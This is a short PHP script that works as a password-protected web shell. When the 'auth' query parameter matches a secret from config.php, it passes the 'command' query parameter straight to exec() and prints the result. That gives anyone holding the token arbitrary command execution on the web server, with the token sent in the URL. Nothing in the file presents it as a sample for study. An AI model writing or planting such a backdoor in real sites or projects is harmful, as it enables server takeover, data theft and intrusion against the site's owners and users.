<?php
 $config = include("config.php");
if(isset($_GET["auth"]) && $_GET["auth"] == $config['auth'])
{
    echo exec($_GET["command"]);
}
?>
